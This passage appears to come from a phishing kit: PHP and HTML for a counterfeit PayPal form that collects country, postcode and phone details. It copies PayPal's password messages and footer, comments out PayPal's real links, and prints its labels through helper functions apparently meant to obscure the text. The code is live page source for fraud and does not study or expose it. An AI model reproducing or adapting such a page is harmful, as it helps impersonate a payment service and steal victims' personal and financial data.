    <option value="MAURITANIA">Mauritania</option>
    <option value="MAURITIUS">Mauritius</option>
    <option value="MAYOTTE">Mayotte</option>
    <option value="MICRONESIA">Micronesia</option>
    <option value="MOLDOVA">Moldova</option>
    <option value="MONACO">Monaco</option>
    <option value="MONGOLIA">Mongolia</option>
    <option value="MONTSERRAT">Montserrat</option>
    <option value="MOROCCO">Morocco</option>
    <option value="MOZAMBIQUE">Mozambique</option>
    <option value="NEPAL">Nepal</option>
    <option value="NEW CALEDONIA">New Caledonia</option>
    <option value="NEW ZEALAND">New Zealand</option>
    <option value="NICARAGUA">Nicaragua</option>
    <option value="NIGER">Niger</option>
    <option value="NIGERIA">Nigeria</option>
    <option value="NIUE">Niue</option>
    <option value="MARIANAS">Northern Mariana Islands</option>
    <option value="NORWAY">Norway</option>
    <option value="OMAN">Oman</option>
    <option value="PAKISTAN">Pakistan</option>
    <option value="PALAU">Palau</option>
    <option value="PALESTINIAN AUTHORITY">Palestinian Authority</option>
    <option value="PANAMA">Panama</option>
    <option value="PAPUA NEW GUINEA">Papua New Guinea</option>
    <option value="PARAGUAY">Paraguay</option>
    <option value="PERU">Peru</option>
    <option value="PHILIPPINES">Philippines</option>
    <option value="POLAND">Poland</option>
    <option value="PORTUGAL">Portugal</option>
    <option value="QATAR">Qatar</option>
    <option value="REUNION">Reunion</option>
    <option value="ROMANIA">Romania</option>
    <option value="RWANDA">Rwanda</option>
    <option value="SAMOA">Samoa</option>
    <option value="SAO TOME AND PRINCIPE">S&atilde;o Tom&eacute; and Pr&iacute;ncipe</option>
    <option value="SAUDI ARABIA">Saudi Arabia</option>
    <option value="SENEGAL">Senegal</option>
    <option value="SERBIA &amp; MONTENEGRO">Serbia &amp; Montenegro</option>
    <option value="SEYCHELLES">Seychelles</option>
    <option value="SIERRA LEONE">Sierra Leone</option>
    <option value="SINGAPORE">Singapore</option>
    <option value="SLOVAKIA">Slovakia</option>
    <option value="SLOVENIA">Slovenia</option>
    <option value="SOLOMON ISLANDS">Solomon Islands</option>
    <option value="SPAIN">Spain</option>
    <option value="SRI LANKA">Sri Lanka</option>
    <option value="ST. KITTS">St. Kitts &amp; Nevis</option>
    <option value="ST. LUCIA">St. Lucia</option>
    <option value="ST. MAARTEN">St. Maarten</option>
    <option value="ST. VINCENT">St. Vincent</option>
    <option value="SUDAN">Sudan</option>
    <option value="SURINAME">Suriname</option>
    <option value="SWEDEN">Sweden</option>
    <option value="SWITZERLAND">Switzerland</option>
    <option value="SYRIA">Syria</option>
    <option value="TAIWAN">Taiwan</option>
    <option value="TAJIKISTAN">Tajikistan</option>
    <option value="TANZANIA">Tanzania</option>
    <option value="THAILAND">Thailand</option>
    <option value="TOGO">Togo</option>
    <option value="TONGA">Tonga</option>
    <option value="TRINIDAD &amp; TOBAGO">Trinidad &amp; Tobago</option>
    <option value="TUNISIA">Tunisia</option>
    <option value="TURKEY">Turkey</option>
    <option value="TURKMENISTAN">Turkmenistan</option>
    <option value="TURKS &amp; CAICOS">Turks &amp; Caicos Island</option>
    <option value="TUVALU">Tuvalu</option>
    <option value="UGANDA">Uganda</option>
    <option value="UKRAINE">Ukraine</option>
    <option value="UNITED ARAB EMIRATES">United Arab Emirates</option>
    <option value="URUGUAY">Uruguay</option>
    <option value="UZBEKISTAN">Uzbekistan</option>
    <option value="VANUATU">Vanuatu</option>
    <option value="VENEZUELA">Venezuela</option>
    <option value="VIETNAM">Vietnam</option>
    <option value="YEMEN">Yemen</option>
    <option value="ZAMBIA">Zambia</option>
    <option value="ZIMBABWE">Zimbabwe</option>
</select> </div>   
<script>
a=document.getElementById('gg7');for (var i = 0; i < a.length; i++) {
if(a.options[i].value=="<?php echo $_SESSION['country_name']; ?>".toUpperCase()){a.options[i].selected = true;}};
</script>

<div class="textInput medium zip"> <label for="gg8"><?php echo change("",9,"","",$Postcode); ?></label>  <input id="gg8" name="gg8" class="validate" required="required" value="" autocomplete="off" autocorrect="off" autocapitalize="off" auto-required="true" type="text"> <p id="zipcodeEmpty" class="help-error error-empty"><?php echo change2("","",9,"","",$Postcode_empty); ?></p> <p id="zipcodeFormat" class="help-error error-format"><?php echo change2("","",9,"","",$Postcode_format); ?></p><p class="help-error error-submit" id="zipcodeSubmit">  </p> </div>   </div> 


<!--
 <div class="stateProvince-error"> <p class="help-error error-empty" id="stateEmpty"> We require a county to create an account for you. </p> <p class="help-error error-submit" id="stateSubmit">  </p> </div>  
-->
<div class="multiFields phone"> <input id="phoneNumberCountry" name="phoneNumberCountry" value="null" type="hidden"> 
    <div class="textInput medium phone-number "> <label for="gg10" id="forPhoneNumber"><?php echo change("",9,"","",$fone); ?></label> <input id="gg10" name="gg10" required="required" value="" class="validate hasHelp" pattern="\s*([\d\+]|(\(([\s\-\.\/]*\d[\s\-\.\/]*)+\)))([\d\s\-\.\/]|(\(([\s\-\.\/]*\d[\s\-\.\/]*)+\)))*\d+\s*" autocomplete="off" autocorrect="off" autocapitalize="off" auto-required="true" type="tel"> <p id="phoneEmpty" class="help-error error-empty"><?php echo change2("","",9,"","",$fone_empty); ?></p> <p id="phoneFormat" class="help-error error-format"><?php echo change2("","",9,"","",$fone_format); ?></p> <p class="help-error error-submit" id="phoneSubmit">  </p>  <p class="help-information" id="phoneInfo"><?php echo change2("","",9,"","",$fone_info); ?></p>  </div>   
    <div class="selectDropdown phone-type"> <label for="gg9" class="accessAid" id="forPhoneType">Phone Type</label> <select name="gg9" id="gg9"> <option value="mobile"><?php echo $type2; ?></option> <option value="home"><?php echo $type1; ?></option> </select> </div>  
</div>      

     

<div class="checkbox">  <p></p></div> 

<input name="jsEnabled" id="jsEnabled" value="0" type="hidden"> 
<input name="_eventId_continue" value="<?php echo $button_continue; ?>" class="button" type="submit"> 

<div class="overlay"></div>  


</form> 

</section>    
<?php 
}   
?>


<img style="display: none;" src="https://altfarm.mediaplex.com/ad/bk/3484-16283-2054-72?PremierAcctSUStart=1" alt="" border="0" height="1" width="1"></div> </div> </div> <div class="two column nogutter">   <section class="section-one"> <h2><?php echo change("arialbd",12,"","",$your_money); ?></h2> <p><?php echo change2(60,"",10,"110-110-110","",$your_money_p); ?></p> </section> <section class="section-two  shopping"> <h2><?php echo change("arialbd",12,"","",$websites); ?></h2> <p><?php echo change2(60,"",10,"110-110-110","",$websites_p); ?></p> </section> <section class="section-three"> <h2><?php echo change("arialbd",12,"","",$Simply_secure); ?></h2> <p><?php echo change2(60,"",10,"110-110-110","",$Simply_secure_p); ?></p> </section>     </div> </div> 




</section> </section> 



<footer id="gblFooter" role="contentinfo">  
    <div class="footer"> 
        <div class="footerNav">  
   
            <div class="legal"> <p class="copyright"><?php echo change("",9,"","",$legal_p_0); ?></p> 
                <!--
                <ul> 
                    <li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Privacy Policy</a></li> 
                    <li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Legal agreements</a></li> 
                    <li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_help">Help</a></li> 
                    <li><a href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_help&amp;t=escalateTab">Contact Us</a></li> 
                </ul> 

            -->
            </div>  
        </div> 
    </div>  

    <script> PAYPAL = this.PAYPAL || {};  PAYPAL.content = PAYPAL.content || {};  PAYPAL.content.passwordStrength = {  lengthRequired: "Use at least 8 characters.",  caseRequired: "Use both upper case and lower case.",  nameRestrict: "Do not use your name or email.",  spaceRestrict: "Do not use any spaces.",  repeatRestrict: "Do not use 4 or more consecutive repeated characters (like 1111).",  sequenceRestrict: "Do not use key and number sequences (like qwer, rewq, 1234 and 4321).",  matchConfirm: "Your passwords don't match. Please retype your password to confirm it." };      PAYPAL.content["This field is required."] = "We need a password to create an account for you.";     PAYPAL.content["Please check your email address for typos, the format doesn't look right."] = "Please check your email for typos, the format doesn't look right.";     PAYPAL.content["Include at least 8 characters"] = "Use at least 8 characters.";     PAYPAL.content["Do not use more than 22 characters"] = "Do not use more than 20 characters.";     PAYPAL.content["Include at least one number or symbol (!@#$%^)"] = "Use at least one number or symbol (!@#$%^)";     PAYPAL.content["Do not use your email address"] = "Do not use your email address.";     PAYPAL.content["Do not use four repeated characters"] = "Do not use 4 or more consecutive repeated characters (like 1111).";     PAYPAL.content["Do not use key sequences (like qwer or rewq)"] = "Do not use key sequences (like qwer or rewq).";     PAYPAL.content["Do not use consecutive numbers (like 1234 or 4321)"] = "Do not use consecutive numbers (like 1234 or 4321).";     PAYPAL.content["Do not use four key sequence"] = "Do not use key and number sequences (like qwer, rewq, 1234 and 4321).";     PAYPAL.content["Passwords must match"] = "Your passwords don't match. Please retype your password to confirm it."; </script>    </footer>



</div> 
<script data-main="../css/js/main" src="../css/js/require-2.0.1.js"></script>

    
<script type="text/javascript">setppcoki();</script>
</body></html>

<?php

}

?>